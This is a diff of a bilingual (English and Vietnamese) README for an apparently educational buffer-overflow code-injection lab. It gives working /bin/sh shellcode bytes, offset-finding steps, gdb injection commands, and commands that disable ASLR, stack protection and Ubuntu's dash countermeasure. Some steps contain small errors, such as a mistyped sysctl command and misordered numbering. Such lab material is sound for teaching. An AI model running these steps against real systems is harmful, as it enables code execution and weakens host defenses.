@@ -1,28 +1,30 @@
-Tips for code injection lab:
-Write shellcode program in assembly language (sh.asm), compile with nasm (sh.o) then link with ld to generate executable file (sh)
+**Tips for code injection lab:**<br>
+1. Write shellcode program in assembly language (sh.asm), compile with nasm (sh.o) then link with ld to generate executable file (sh)
 (Viết chương trình shellcode bằng hợp ngữ, biên dịch (nasm) và liên kết (ld) để tạo chương trình thực thi)
-Run the folowing script to get the hex string of shellcode:
-(Chạy bash script dưới đây ở dòng lệnh để tạo chuỗi hex của shellcode:)
-$> for i in $(objdump -d shell |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
---> hex string generated: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80
-or run this script to generate shellcode binary file:
-(Hoặc chạy bash script dưới đây ở dòng lệnh để sinh binary file mã shellcode nếu inject bằng cách đọc file)
-$> for i in $(objdump -d sh |grep "^ " |cut -f2); do echo -ne '\x'$i >> sh.bin; done; 
-Estimate buffer size of vulnerable program with input strings of various length (eg. ./vuln.out $(python -c "print('a'*nnn)")
-(Ước lượng size từ đỉnh stack đến eip khi biên dịch chương trình với option -fno-stack-protector khi gcc)
-Compute the distance between buffer (esp) and return address to determine the padding bytes will be injected along with the sheelcode.
-(Tính toán khoảng cách từ buffer đến eip để xác định padding bytes chèn cùng với shellcode)
-Prepare for the lab environment:
-Turn off OS's address space layout randomization (sudo setctl -w kernel.randomization_va_space)
-(Tắt chế độ tạo cấp phát địa chỉ stack ngẫu nhiên khi load chương trình của HĐH)
-Compile program with options to defeat stack protecting mechanism and code execution o stack:
-(Biên dịch chương trình c với các option tắt cơ chế bảo vệ stack và cho phép thực thi code trên stack)
-$> gcc vuln.c -o vuln.out -fno-stack-protector -z execstack
-Load vuln.out in gdb 
-(Nạp vuln.out trong gdb)
-$> gdb vuln.out
-Set break point after strcpy instruction
-(Đặt điểm dừng chương trình sau lệnh strcpy)
+2. Run the folowing script to get the hex string of shellcode:<br>
+(Chạy bash script dưới đây ở dòng lệnh để tạo chuỗi hex của shellcode:)<br>
+`$> for i in $(objdump -d shell |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo`
+<br>--> hex string generated: `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80`<br>
+or run this script to generate shellcode binary file:<br>
+(Hoặc chạy bash script dưới đây ở dòng lệnh để sinh binary file mã shellcode nếu inject bằng cách đọc file)<br>
+`$> for i in $(objdump -d sh |grep "^ " |cut -f2); do echo -ne '\x'$i >> sh.bin; done;` <br>
+3. Estimate buffer size of vulnerable program with input strings of various length (eg. `./vuln.out $(python -c "print('a'*nnn)"`)<br>
+(Ước lượng size từ đỉnh stack đến eip khi biên dịch chương trình với option -fno-stack-protector khi gcc)<br>
+4. Compute the distance between buffer (esp) and return address to determine the padding bytes will be injected along with the sheelcode.<br>
+(Tính toán khoảng cách từ buffer đến eip để xác định padding bytes chèn cùng với shellcode)<br>
+**Prepare for the lab environment:**
+5. Turn off OS's address space layout randomization (`sudo setctl -w kernel.randomization_va_space`)<br>
+(Tắt chế độ tạo cấp phát địa chỉ stack ngẫu nhiên khi load chương trình của HĐH)<br>
+6. Compile program with options to defeat stack protecting mechanism and code execution o stack:<br>
+(Biên dịch chương trình c với các option tắt cơ chế bảo vệ stack và cho phép thực thi code trên stack)<br>
+`$> gcc vuln.c -o vuln.out -fno-stack-protector -z execstack`<br>
+7. Creat link to zsh instead of default dash to turn off bash countermeasures of Ubuntu 16.04:<br>
+`$> sudo ln -sf /bin/zsh /bin/sh`<br>
+9. Load vuln.out in gdb <br>
+(Nạp vuln.out trong gdb)<br>
+`$> gdb vuln.out`<br>
+8. Set break point after strcpy instruction <br>
+(Đặt điểm dừng chương trình sau lệnh strcpy)<br>
 Run program in gdb with injecting argument
 (Khởi chạy chương trình trong gdb, chèn chuỗi hex của shellcode trên dòng lệnh)
 (gdb-peda)r $(python -c "print(<injecting shellcode along with padding bytes>+'\xff\xff\xff\xff')")
